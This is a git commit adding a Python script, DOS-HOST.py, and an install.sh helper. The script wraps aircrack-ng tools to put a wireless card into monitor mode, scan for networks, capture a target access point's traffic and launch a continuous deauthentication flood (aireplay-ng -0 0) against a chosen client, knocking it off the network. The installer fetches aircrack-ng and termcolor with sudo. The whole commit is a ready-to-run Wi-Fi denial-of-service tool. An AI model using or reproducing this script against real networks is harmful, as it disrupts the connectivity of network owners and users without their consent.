e73fd2f3119043bc3632dac8e814d2471a99ddf8
Adrián <79727938+clhore@users.noreply.github.com>
2021-11-02 19:31:38 +0000

    Add files via upload

---
+++ DOS-HOST.py
@@ -0,0 +1,101 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+# Author: clhore
+
+# library
+from termcolor import colored, cprint
+from os import system, mkdir
+from time import sleep
+
+# custom modules
+
+# Global variables
+banner = colored('''
+
+ ▓█████▄  ▒█████    ██████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓   
+▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒   
+░██   █▌▒██░  ██▒░ ▓██▄   ▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░   
+░▓█▄   ▌▒██   ██░  ▒   ██▒░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░    
+░▒████▓ ░ ████▓▒░▒██████▒▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░    
+ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░      
+ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░   
+ ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░   ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░         
+   ░        ░ ░        ░   ░  ░  ░    ░ ░        ░              
+ ░                                                              
+        
+    ''', 'red')
+
+def modeMonitor(nic: str, mode=False):
+    if mode:
+        mon0 = f'airmon-ng start {nic} > /dev/null'
+        system(mon0)
+        cprint(f'[*] Inteface {nic} mode monitor', 'green')
+        sleep(2)
+
+    else:
+        system('clear')
+        mon0 = 'airmon-ng stop {0} >/dev/null'.format(nic)
+        system(mon0)
+        sleep(1)
+        cprint('[*] Stop airmon-ng', 'green')
+        mon0 = 'ip link set {0} up 2>/dev/null'.format(nic.replace('mon', ''))
+        system(mon0)
+        sleep(1)
+        cprint(f'[*] Inteface {nic} up', 'green')
+
+
+def scanWIFIs(nic: str):
+    cprint(f'[*] Start scan', 'green')
+    sleep(1)
+    airodump0 = f'airodump-ng {nic} 2>/dev/null'
+    system(airodump0)
+
+def scanWIFI(BSSID: str, channel: str, capDirectory: str, nic: str):
+    airodump1 = f'airodump-ng --bssid {BSSID} --channel {channel} --write {capDirectory} {nic} 2>/dev/null'
+    system(airodump1)
+
+def DOS_HOST(BSSID: str, STATION: str, nic: str):
+    aireplay = f'aireplay-ng -0 0 -a {BSSID} -c {STATION} {nic}'
+    system(aireplay)
+
+if __name__ == '__main__':
+
+    print(banner)
+
+    # Select your network card
+    NetworkCard0 = input('Select networkCard: ')
+    NetworkCard1 = f'{NetworkCard0}mon'
+
+    # Network card mode monitor
+    modeMonitor(NetworkCard0, True)
+
+    # wifi scan
+    scanWIFIs(NetworkCard1)
+    
+    # Target
+    BSSID = input('BSSID: ')
+    CH = input('CH: ')
+
+    # Save capture
+    opt = input('Default directory [y/n]: ')
+    
+    if opt == 'n':
+        cap = input('Directory to save the capture: ')
+    else:
+        system('rm -rf scan/ 2>/dev/null')
+        mkdir('scan')
+        cap = 'scan/'
+
+    # Start airodump-ng
+    scanWIFI(BSSID, CH, cap, NetworkCard1)
+
+    # Host target
+    ST = input('STATION: ')
+
+    # Deautenticate host
+    DOS_HOST(BSSID, ST, NetworkCard1)
+    sleep(1)
+    
+    # Network card stop mode monitor
+    modeMonitor(NetworkCard1)
---
+++ install.sh
@@ -0,0 +1,63 @@
+#!/usr/bin/bash
+
+# Colours
+declare -r greenColour="\e[0;32m\033[1m"
+declare -r endColour="\033[0m\e[0m"
+declare -r redColour="\e[0;31m\033[1m"
+declare -r blueColour="\e[0;34m\033[1m"
+declare -r yellowColour="\e[0;33m\033[1m"
+declare -r purpleColour="\e[0;35m\033[1m"
+declare -r turquoiseColour="\e[0;36m\033[1m"
+declare -r grayColour="\e[0;37m\033[1m"
+
+# Global Variables
+declare -r pythonLibrary=(termcolor)
+
+
+function installPanel(){
+   
+    echo -e "\n${redColour}[!] Usage: ./htbExplorer${endColour}"
+    for i in $(seq 1 80); do echo -ne "${redColour}-"; done; echo -ne "${endColour}"
+}
+
+function dependencies(){
+	clear
+
+	echo -e "\n"
+	read -rp "Cual es su OS >> Arch Linux[a/A] or Ubuntu[u/U]: " sys
+	
+	dependencies=(python aircrack-ng)
+
+	for program in "${dependencies[@]}"; do
+		echo -ne "\n\t${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"
+
+		test -f /usr/bin/$program
+
+		if [ "$(echo $?)" == "0" ]; then
+			echo -e " ${greenColour}(V)${endColour}"
+	
+		else
+			echo -e " ${redColour}(X)${endColour}\n"
+			
+			if [ "$sys" == "a" ] || [ "$sys" == "A" ]; then	
+				sudo pacman -S $program
+			
+			elif [ "$sys" == "u" ] || [ "$sys" == "U" ]; then
+				sudo apt-get install $program	
+			fi
+		fi
+	done
+}
+
+function installPythonLibrary(){
+	for library in "${pythonLibrary[@]}"; do
+		pip install $library 2>/dev/null
+	done
+}
+
+if [ "$(id -u)" == "0" ]; then
+	dependencies
+	installPythonLibrary
+else
+	echo -e 'chmod +x ./install.sh && sudo ./install.sh'
+fi
